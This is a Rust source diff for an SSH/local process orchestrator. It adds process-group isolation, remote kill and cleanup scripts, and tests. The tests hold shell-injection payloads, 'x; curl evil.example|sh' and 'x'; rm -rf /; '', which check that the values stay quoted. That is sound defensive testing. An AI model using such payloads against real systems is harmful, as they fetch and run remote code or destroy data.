@@ -5,7 +5,15 @@
 //!
 //! The master is launched here rather than through `openssh`'s builder so
 //! the inventory's `ssh_args` reach the `ssh` command line verbatim; the
-//! `openssh` crate then drives the multiplexed session (`Session::resume`).
+//! `openssh` crate then drives the multiplexed session
+//! (`Session::resume_mux`).
+//!
+//! Ctrl-c on the orchestrator must not kill what it spawned: the binary is
+//! told to stop with a `Cancel` frame and gets ten seconds (vision doc 5.5).
+//! Local children therefore start in their own process group, and the
+//! session is resumed with the native mux client so no per-command `ssh`
+//! process sits in the terminal's foreground group; the master itself is
+//! daemonized by ssh (`-f`).
 
 use std::path::Path;
 use std::pin::Pin;
@@ -50,6 +58,25 @@ pub struct Proc {
     pub stdout: Pin<Box<dyn AsyncRead + Send>>,
     stderr: Pin<Box<dyn AsyncRead + Send>>,
     waiter: Waiter,
+    /// What `kill` needs if this process has to be stopped. `None` for a
+    /// process that is never a kill target (the upload shell).
+    kill: Option<KillTarget>,
+}
+
+/// What stopping a playbook binary takes, all of it decided by the caller
+/// rather than recovered from `argv`: behind `sudo -n -u <someone-not-root>`
+/// the binary is the fifth word, not the first non-flag one, and a killed
+/// process runs no destructor so its temp directory has to be named from
+/// outside. See `run::exec_argv`'s test.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct KillTarget {
+    /// Absolute path of the executable to hunt for.
+    pub binary: String,
+    /// Basename of the run's temp directory, under the target's `TMPDIR`.
+    pub run_dir: String,
+    /// The escalation prefix the binary was launched with. The directory
+    /// belongs to whoever that is, so removing it needs the same prefix.
+    pub escalate: Vec<String>,
 }
 
 enum Waiter {
@@ -161,7 +188,7 @@ impl Transport {
                 }
             );
         }
-        let session = Session::resume(ctl.into_boxed_path(), Some(log.into_boxed_path()));
+        let session = Session::resume_mux(ctl.into_boxed_path(), Some(log.into_boxed_path()));
         session
             .check()
             .await
@@ -191,6 +218,7 @@ impl Transport {
                 tokio::process::Command::new("sh")
                     .arg("-c")
                     .arg(script)
+                    .process_group(0)
                     .output()
                     .await?
             }
@@ -244,7 +272,9 @@ impl Transport {
              mkdir -p \"$(dirname \"$p\")\"; \
              cat > \"$t\"; chmod 755 \"$t\"; mv \"$t\" \"$p\""
         );
-        let mut proc = self.spawn(&["sh".into(), "-c".into(), script]).await?;
+        let mut proc = self
+            .spawn(&["sh".into(), "-c".into(), script], None)
+            .await?;
         proc.stdin.write_all(bytes).await?;
         proc.stdin.shutdown().await?;
         // Close our handle so the remote sees EOF, then wait.
@@ -261,8 +291,9 @@ impl Transport {
 
     /// Spawn `argv` with piped stdio, no shell in between: paths are
     /// absolute by now and `openssh` quotes each argument for the remote
-    /// shell.
-    pub async fn spawn(&self, argv: &[String]) -> Result<Proc> {
+    /// shell. `kill` describes how to stop this process later, `None` when
+    /// it is never cancelled (the upload shell).
+    pub async fn spawn(&self, argv: &[String], kill: Option<KillTarget>) -> Result<Proc> {
         let (prog, rest) = argv.split_first().context("empty argv")?;
         match self {
             Transport::Local => {
@@ -271,6 +302,10 @@ impl Transport {
                     .stdin(std::process::Stdio::piped())
                     .stdout(std::process::Stdio::piped())
                     .stderr(std::process::Stdio::piped())
+                    // Its own process group, so ctrl-c in the terminal is
+                    // delivered to the orchestrator alone and `Cancel` gets
+                    // its grace period.
+                    .process_group(0)
                     .spawn()
                     .with_context(|| format!("spawning {}", argv.join(" ")))?;
                 Ok(Proc {
@@ -278,6 +313,7 @@ impl Transport {
                     stdout: Box::pin(child.stdout.take().unwrap()),
                     stderr: Box::pin(child.stderr.take().unwrap()),
                     waiter: Waiter::Local(child),
+                    kill,
                 })
             }
             Transport::Ssh { session, .. } => {
@@ -296,15 +332,250 @@ impl Transport {
                     stdout: Box::pin(child.stdout().take().unwrap()),
                     stderr: Box::pin(child.stderr().take().unwrap()),
                     waiter: Waiter::Ssh(Some(child)),
+                    kill,
                 })
             }
         }
+    }
+
+    /// Stop a process that ignored `Cancel` for too long. Locally the whole
+    /// process group goes (the binary and any helper it spawned); over SSH
+    /// every process running the binary's path is killed, since the mux
+    /// channel cannot signal the remote process.
+    pub async fn kill(&self, proc: &mut Proc) -> Result<()> {
+        let target = proc.kill.clone();
+        let killed = match (&mut proc.waiter, self) {
+            (Waiter::Local(child), _) => {
+                if let Some(pid) = child.id() {
+                    // Negative pid: the process group we created at spawn.
+                    let _ = tokio::process::Command::new("kill")
+                        .args(["-KILL", "--", &format!("-{pid}")])
+                        .status()
+                        .await;
+                }
+                child.start_kill().ok();
+                true
+            }
+            (Waiter::Ssh(_), Transport::Ssh { .. }) => {
+                // The mux channel cannot signal the remote process, so the
+                // binary and its children (a step's command, a helper) are
+                // killed by pid. `pgrep -f` is only the candidate list: the
+                // pattern is the binary's path, and this script's own shell
+                // has that path on its command line too, so a bare `pgrep
+                // -f` loop kills the killer and whichever of the real
+                // targets it had not reached yet. `/proc/<pid>/exe` is the
+                // filter that tells the two apart.
+                let Some(t) = &target else {
+                    bail!("no kill target for this process");
+                };
+                self.sh(&kill_script(t)).await?;
+                true
+            }
+            _ => false,
+        };
+        // A killed process runs no destructor, so the run's temp directory
+        // and every streamed file in it stay behind. Nothing else ever
+        // collects them, so the side that did the killing clears up. Doing
+        // it after the kill, not before, means the binary cannot recreate
+        // it; `rm -rf` on a directory that is already gone is not an error,
+        // so a run that ended cleanly is unaffected.
+        if killed && let Some(t) = &target {
+            self.sh(&remove_run_dir_script(t)).await?;
+        }
+        Ok(())
+    }
+}
+
+/// The remote snippet that kills the binary and its children. Only
+/// processes actually running it are signalled: `/proc/<pid>/exe` is the
+/// kernel's answer to "what is this process running", where a command line
+/// is just text that anything, this script included, can carry.
+///
+/// It runs behind the binary's own escalation prefix, because both halves
+/// need the identity that owns the processes. `/proc/<pid>/exe` is not
+/// readable for another user's process (it needs ptrace access), so an
+/// unescalated script skips every candidate of an escalated run at the
+/// guard, and `kill` would be refused even if it reached one. Such a run
+/// used to survive this script entirely and die from the ssh session being
+/// torn down, which is luck rather than cancellation.
+fn kill_script(t: &KillTarget) -> String {
+    let q = shell_quote(&t.binary);
+    let inner = format!(
+        "for p in $(pgrep -f {q}); do \
+           [ \"$(readlink /proc/$p/exe 2>/dev/null)\" = {q} ] || continue; \
+           pkill -KILL -P \"$p\"; kill -KILL \"$p\"; \
+         done 2>/dev/null; true"
+    );
+    match escalation_words(&t.escalate) {
+        None => inner,
+        Some(esc) => format!("{esc} sh -c {}", shell_quote(&inner)),
+    }
+}
+
+/// The escalation prefix as shell words, each quoted. `escalate_user` comes
+/// from the inventory unvalidated, and the inventory is data in our model:
+/// everywhere else it reaches the target as an argv element that `openssh`
+/// quotes, and only these scripts put it through a shell, so they quote it
+/// themselves. `None` when nothing escalates.
+fn escalation_words(prefix: &[String]) -> Option<String> {
+    if prefix.is_empty() {
+        return None;
+    }
+    Some(
+        prefix
+            .iter()
+            .map(|w| shell_quote(w))
+            .collect::<Vec<_>>()
+            .join(" "),
+    )
+}
+
+/// Remove the run's temp directory on the target.
+///
+/// `${TMPDIR:-/tmp}` is resolved on the target, by the same session that
+/// launched the binary, so it matches what Rust's `env::temp_dir` chose
+/// there. The escalation prefix is the one the binary ran behind: an
+/// escalated run creates the directory as that user, and only that user
+/// can remove it.
+fn remove_run_dir_script(t: &KillTarget) -> String {
+    let dir = shell_quote(&t.run_dir);
+    // `$TMPDIR` is expanded by the session's own shell and `rm` gets the
+    // result as an argument. Expanding it inside an escalated shell would
+    // read root's environment, not the one the binary ran with.
+    let path = format!("\"${{TMPDIR:-/tmp}}\"/{dir}");
+    match escalation_words(&t.escalate) {
+        None => format!("rm -rf -- {path}; true"),
+        Some(esc) => format!("{esc} rm -rf -- {path}; true"),
     }
 }
 
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn the_run_directory_is_removed_as_whoever_created_it() {
+        let unescalated = KillTarget {
+            binary: "/home/cadu/.cache/rustible/bin/p-ab".into(),
+            run_dir: ".rustible-1a2b".into(),
+            escalate: vec![],
+        };
+        let script = remove_run_dir_script(&unescalated);
+        // TMPDIR is resolved on the target, by the session that launched
+        // the binary, so it matches what `env::temp_dir` chose there.
+        assert!(
+            script.contains("\"${TMPDIR:-/tmp}\"/'.rustible-1a2b'"),
+            "{script}"
+        );
+        assert!(!script.contains("sudo"), "{script}");
+
+        // Escalated, the directory belongs to the escalated user and only
+        // that user can remove it.
+        let as_root = KillTarget {
+            escalate: vec!["sudo".into(), "-n".into()],
+            ..unescalated.clone()
+        };
+        assert!(
+            remove_run_dir_script(&as_root).starts_with("'sudo' '-n' rm -rf --"),
+            "{}",
+            remove_run_dir_script(&as_root)
+        );
+        let as_admin = KillTarget {
+            escalate: vec!["sudo".into(), "-n".into(), "-u".into(), "admin".into()],
+            ..unescalated.clone()
+        };
+        assert!(
+            remove_run_dir_script(&as_admin).starts_with("'sudo' '-n' '-u' 'admin' rm -rf --"),
+            "{}",
+            remove_run_dir_script(&as_admin)
+        );
+
+        // The name arrives over the wire; it cannot close the quoting.
+        let nasty = KillTarget {
+            run_dir: "x'; rm -rf /; '".into(),
+            ..unescalated.clone()
+        };
+        let script = remove_run_dir_script(&nasty);
+        assert!(!script.contains("x'; rm -rf /"), "{script}");
+    }
+
+    /// `escalate_user` is an unvalidated string from the KDL inventory. It
+    /// is safe everywhere else because `exec_argv` passes it as argv and
+    /// `openssh` quotes each element; these two scripts are the only place
+    /// it goes through a shell, so they quote it themselves.
+    #[test]
+    fn an_escalate_user_with_shell_metacharacters_is_quoted_not_run() {
+        let evil = KillTarget {
+            binary: "/home/x/.cache/rustible/bin/p-ab".into(),
+            run_dir: ".rustible-1a".into(),
+            escalate: vec![
+                "sudo".into(),
+                "-n".into(),
+                "-u".into(),
+                "x; curl evil.example|sh".into(),
+            ],
+        };
+        for script in [kill_script(&evil), remove_run_dir_script(&evil)] {
+            // One quoted word, so `sh` passes it to sudo as a username
+            // rather than ending the command and running `curl`.
+            assert!(
+                script.contains("'x; curl evil.example|sh'"),
+                "expected the user quoted as one word: {script}"
+            );
+            assert!(
+                !script.contains(" x; curl"),
+                "the payload appears as a bare word: {script}"
+            );
+        }
+    }
+
+    /// An escalated run's processes belong to the escalated user, and
+    /// `/proc/<pid>/exe` is not readable for another user's process, so an
+    /// unescalated kill script skips every candidate at its own guard.
+    #[test]
+    fn the_kill_script_runs_as_the_identity_that_owns_the_processes() {
+        let plain = KillTarget {
+            binary: "/home/cadu/.cache/rustible/bin/p-ab".into(),
+            run_dir: ".rustible-1a".into(),
+            escalate: vec![],
+        };
+        assert!(kill_script(&plain).starts_with("for p in $(pgrep -f "));
+
+        let as_root = KillTarget {
+            escalate: vec!["sudo".into(), "-n".into()],
+            ..plain
+        };
+        let script = kill_script(&as_root);
+        assert!(script.starts_with("'sudo' '-n' sh -c "), "{script}");
+        // The inner script's own expansions survive the nesting.
+        assert!(script.contains("pgrep -f "), "{script}");
+        assert!(script.contains("readlink /proc/"), "{script}");
+    }
+
+    #[test]
+    fn kill_script_only_signals_processes_running_the_binary() {
+        let bare = |bin: &str| KillTarget {
+            binary: bin.into(),
+            run_dir: ".rustible-1a".into(),
+            escalate: vec![],
+        };
+        let script = kill_script(&bare("/home/cadu/.cache/rustible/bin/cadu_slow-ab12"));
+        // The path is quoted once for `pgrep` and once for the comparison,
+        // and nothing is killed before `/proc/<pid>/exe` has been checked.
+        assert_eq!(
+            script
+                .matches("'/home/cadu/.cache/rustible/bin/cadu_slow-ab12'")
+                .count(),
+            2
+        );
+        let guard = script.find("readlink /proc/$p/exe").expect("checks exe");
+        assert!(guard < script.find("kill -KILL").expect("kills"));
+        // A path with a quote in it cannot close the quoting and run
+        // something: the quote comes back escaped, never bare.
+        let nasty = kill_script(&bare("/tmp/x'; rm -rf /; '"));
+        assert!(!nasty.contains("x'; rm"), "{nasty}");
+        assert!(nasty.contains("x'\\''; rm"), "{nasty}");
+    }
 
     #[test]
     fn master_argv_passes_only_what_the_inventory_set() {
